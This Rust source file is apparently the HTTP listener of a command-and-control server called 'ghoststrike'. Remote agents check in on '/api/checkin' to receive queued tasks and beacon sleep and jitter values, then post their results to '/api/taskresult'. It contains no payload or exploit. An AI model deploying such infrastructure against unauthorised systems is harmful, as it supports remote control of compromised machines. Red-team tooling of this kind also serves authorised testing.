use anyhow::Result;
use axum::{
    extract::State,
    routing::post,
    Json, Router,
};
use tokio::sync::oneshot;
use tracing::info;

use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, TaskResultReq};
use crate::state::SharedState;

pub async fn start(
    state: SharedState,
    cfg: ghoststrike_common::ListenerConfig,
    shutdown_rx: oneshot::Receiver<()>,
) -> Result<tokio::task::JoinHandle<()>> {
    let addr: std::net::SocketAddr = format!("{}:{}", cfg.host, cfg.port).parse()?;
    let app = agent_router(state);

    let handle = tokio::spawn(async move {
        info!("HTTP listener on {addr}");
        let listener = tokio::net::TcpListener::bind(addr).await.expect("bind");
        axum::serve(listener, app)
            .with_graceful_shutdown(async { shutdown_rx.await.ok(); })
            .await
            .ok();
        info!("HTTP listener shut down");
    });

    Ok(handle)
}

pub fn agent_router(state: SharedState) -> Router {
    Router::new()
        .route("/api/checkin",    post(checkin_handler))
        .route("/api/taskresult", post(taskresult_handler))
        .with_state(state)
}

async fn checkin_handler(
    State(state): State<SharedState>,
    Json(req): Json<AgentCheckinReq>,
) -> Json<AgentCheckinResp> {
    state.upsert_agent(req.info).await;
    let tasks      = state.pending_tasks_for(req.agent_id).await;
    let sleep_ms   = 5000u64;
    let jitter_pct = 10u8;
    Json(AgentCheckinResp { tasks, sleep_ms, jitter_pct })
}

async fn taskresult_handler(
    State(state): State<SharedState>,
    Json(req): Json<TaskResultReq>,
) -> Json<serde_json::Value> {
    state
        .update_task_result(req.agent_id, req.task_id, req.output, req.success)
        .await;
    Json(serde_json::json!({ "ok": true }))
}
